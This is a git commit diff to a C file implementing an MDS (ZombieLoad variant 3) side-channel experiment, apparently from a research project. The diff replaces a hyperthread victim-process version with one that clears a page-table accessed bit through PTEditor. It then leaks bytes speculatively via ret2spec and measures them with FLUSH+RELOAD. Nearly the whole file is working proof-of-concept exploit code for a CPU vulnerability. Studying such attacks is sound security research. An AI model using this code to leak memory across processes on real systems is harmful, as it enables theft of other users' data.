1b7476dbb190400851b076595358fcfae1dc82fe
Thijs Raymakers <thijs@raymakers.nl>
2024-01-25 16:49:46 +0100

    Attempt an mds version that changes the access bits

--- code/src/mds.c
+++ code/src/mds.c
@@ -1,84 +1,68 @@
 #define _GNU_SOURCE
-#include <stddef.h>
-#include <stdint.h>
-#include <stdio.h>
+#include <assert.h>
+#include <stdbool.h>
 #include <stdlib.h>
 #include <sys/mman.h>
 #include <unistd.h>
-#include <assert.h>
-#include <string.h>
-#include <signal.h>
-#include <sched.h>
 
-#include "asm.h"
 #include "constants.h"
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wunused-function"
+#include "ptedit_header.h"
+#pragma GCC diagnostic pop
 #include "flush_and_reload.h"
-#include "find_threshold.h"
 #include "ret2spec.h"
 
-pid_t spawn_child() {
-  // Define where to run the RIDL code and where to run the
-  // victim code (different hyperthreads, same physical core)
-  int parent_cpu = 1;
-  int victim_cpu = 3;
-
-  cpu_set_t cpu_set;
-  CPU_ZERO(&cpu_set);
-  CPU_SET(parent_cpu, &cpu_set);
-  int affinity = sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set); 
-  assert(!affinity);
-
-  pid_t pid = fork();
-	if (pid == 0) {
-		while (1)
-			asm volatile(
-				"movq %0, (%%rsp)\n"
-				"mfence\n"
-				::"r"(0xe8e7e6e5e4e3e2e1ull));
-	}
-	if (pid < 0) {
-    fprintf(stderr, "Failed to spawn child process\n");
-    exit(1);
-  };
-
-  CPU_ZERO(&cpu_set);
-  CPU_SET(victim_cpu, &cpu_set);
-  affinity = sched_setaffinity(pid, sizeof(cpu_set_t), &cpu_set); 
-  assert(!affinity);
-  return pid;
-}
-
 struct buffers {
-  void *leak;
+  void *arch_page;
+  void *microarch_page;
   void *reload;
 };
 
+// This function will create three buffers.
+// - Two buffers (arch_page and microarch_page) that point to the same
+//   physical page. If we clear the accessed bit on the microarch_page, then
+//   the CPU will issue a microcode assist to set the accessed bit
+//   speculatively (as described in ZombieLoad variant 3).
+// - The reload buffer where we will measure the cache effects with
+//   FLUSH+RELOAD
 struct buffers create_buffers() {
   struct buffers buffers = {0};
 
-  buffers.leak = mmap(NULL,
-                      PAGE_SIZE,
-                      PROT_READ | PROT_WRITE,
-                      MAP_PRIVATE | MAP_ANONYMOUS,
-                      -1,
-                      0);
-  assert(buffers.leak != MAP_FAILED);
+  const int memfd = memfd_create("shared page", 0);
+  assert(memfd != -1);
+  ftruncate(memfd, PAGE_SIZE);
 
-  // Where we will measure the cache times
-  const size_t reload_size = PAGE_SIZE * VALUES_IN_BYTE;
+  void** const same_page_buffers[2] = {&buffers.arch_page, &buffers.microarch_page};
+  for (int i = 0; i < 2; ++i) {
+    *same_page_buffers[i] = mmap(NULL,
+                                 PAGE_SIZE,
+                                 PROT_READ | PROT_WRITE,
+                                 MAP_SHARED | MAP_POPULATE,
+                                 memfd,
+                                 0);
+    assert(*same_page_buffers[i] != MAP_FAILED);
+  }
+
+  // Test if they are mapped to the same page
+  assert(*(char*)buffers.microarch_page == (char)0);
+  *(char*)buffers.arch_page = 0xAA;
+  assert(*(char*)buffers.microarch_page == (char)0xAA);
+  *(char*)buffers.arch_page = 0;
+
+  // The reload buffer that will be used for FLUSH+RELOAD
   buffers.reload = mmap(NULL,
-                        reload_size,
+                        PAGE_SIZE * VALUES_IN_BYTE,
                         PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                         -1,
                         0);
   assert(buffers.reload != MAP_FAILED);
+
   return buffers;
 }
 
 int main() {
-  pid_t child_pid = spawn_child();
-
   struct buffers buffers = create_buffers();
 
   size_t results[VALUES_IN_BYTE] = {0};
@@ -88,15 +72,25 @@ int main() {
   size_t threshold = 150;
   assert(threshold > 0);
 
-  *(char*)buffers.leak = 0xAA;
-  printf("buffers.leak is at %p\n", buffers.leak);
-  printf("sudo ./pagemap %d %p %p\n", getpid(), (char*)buffers.leak - 1*PAGE_SIZE, (char*)buffers.leak + 1*PAGE_SIZE);
+  // Modifies the access bit of the two pages
+  assert(!ptedit_init());
+  ptedit_pte_set_bit(buffers.arch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
+  ptedit_pte_clear_bit(buffers.microarch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
+
+  // *(char*)buffers.leak = 0xAA;
+  // printf("buffers.leak is at %p\n", buffers.leak);
+  // printf("sudo ./pagemap %d %p %p\n", getpid(), (char*)buffers.leak - 1*PAGE_SIZE, (char*)buffers.leak + 1*PAGE_SIZE);
 
   for (int i = 0; i < 10000; ++i) {
     flush(VALUES_IN_BYTE, PAGE_SIZE, buffers.reload);
-    ret2spec(buffers.leak, buffers.reload);
+    ret2spec(buffers.microarch_page, buffers.reload);
     reload(VALUES_IN_BYTE, PAGE_SIZE, buffers.reload, results, threshold);
   }
+
+  bool arch_access = ptedit_pte_get_bit(buffers.arch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
+  bool microarch_access = ptedit_pte_get_bit(buffers.microarch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
+  printf("Arch access: %d\tMicroarch access: %d\n", arch_access, microarch_access);
+  ptedit_cleanup();
 
   printf("Results:\n");
   for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
@@ -104,8 +98,6 @@ int main() {
       printf("0x%lx\t%ld\n", i, results[i]);
     }
   }
-
-  kill(child_pid, 9);
 
   return 0;
 }
